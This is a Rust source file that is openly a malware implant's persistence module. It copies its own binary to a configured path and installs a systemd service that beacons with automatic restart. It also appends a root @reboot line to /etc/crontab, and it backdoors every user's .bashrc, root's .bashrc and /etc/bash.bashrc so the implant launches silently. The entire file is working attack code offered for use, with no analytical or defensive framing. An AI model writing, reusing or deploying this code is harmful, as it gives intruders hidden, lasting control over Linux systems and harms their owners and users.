/// Persistence installation — tier-aware systemd + cron + shell backdoors.
use crate::config::Config;
use std::fs;
use std::io::{self, Write};
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

/// Install persistence: drop binary, create systemd service, add cron @reboot,
/// optionally backdoor .bashrc or .profile.
pub fn install(config: &Config) -> io::Result<()> {
    let our_binary = fs::read("/proc/self/exe").unwrap_or_default();
    if our_binary.is_empty() { return Ok(()); }

    // Drop binary
    if let Some(parent) = std::path::Path::new(&config.implant_path).parent() {
        let _ = fs::create_dir_all(parent);
    }
    fs::write(&config.implant_path, &our_binary)?;
    fs::set_permissions(&config.implant_path, fs::Permissions::from_mode(0o755))?;

    // Systemd service
    let env_var = match &config.beacon_env_var {
        Some(v) => format!("Environment={}=1\n", v),
        None => String::new(),
    };
    let unit_path = format!("/etc/systemd/system/{}", config.service_name);
    let unit = format!(
        "[Unit]\nDescription={}\nAfter=network.target\n\n\
         [Service]\nType=simple\nExecStart={} {}\n{}\
         Restart=always\nRestartSec={}s\n\n\
         [Install]\nWantedBy=multi-user.target\n",
        config.service_description,
        config.implant_path,
        if config.beacon_env_var.is_some() { "" } else { "--beacon" },
        env_var,
        config.beacon_interval,
    );
    fs::write(&unit_path, unit)?;
    let _ = Command::new("systemctl").args(["daemon-reload"]).output();
    let _ = Command::new("systemctl").args(["enable", &config.service_name]).output();
    let _ = Command::new("systemctl").args(["start", &config.service_name]).output();

    // Cron @reboot (tier1/2 only)
    if config.cron_persist {
        let cron_line = format!("@reboot root {} --beacon &>/dev/null &\n", config.implant_path);
        if let Ok(crontab) = fs::read_to_string("/etc/crontab") {
            if !crontab.contains(&config.implant_path) {
                let mut f = fs::OpenOptions::new().append(true).open("/etc/crontab")?;
                f.write_all(cron_line.as_bytes())?;
            }
        }
    }

    // Shell backdoor: .bashrc (tier1 only) — called separately by tier1 main.rs

    Ok(())
}

/// Add .bashrc backdoor for all users (tier1 only).
pub fn backdoor_bashrc(config: &Config) -> io::Result<()> {
    let line = format!("\n{} --beacon &>/dev/null &\n", config.implant_path);
    for home_dir in &["/home", "/root"] {
        if let Ok(entries) = fs::read_dir(home_dir) {
            for entry in entries.flatten() {
                let bashrc = entry.path().join(".bashrc");
                if bashrc.exists() {
                    let mut f = fs::OpenOptions::new().append(true).open(&bashrc)?;
                    f.write_all(line.as_bytes())?;
                }
            }
        }
    }
    // Also /etc/bash.bashrc for system-wide
    if std::path::Path::new("/etc/bash.bashrc").exists() {
        let mut f = fs::OpenOptions::new().append(true).open("/etc/bash.bashrc")?;
        f.write_all(line.as_bytes())?;
    }
    Ok(())
}
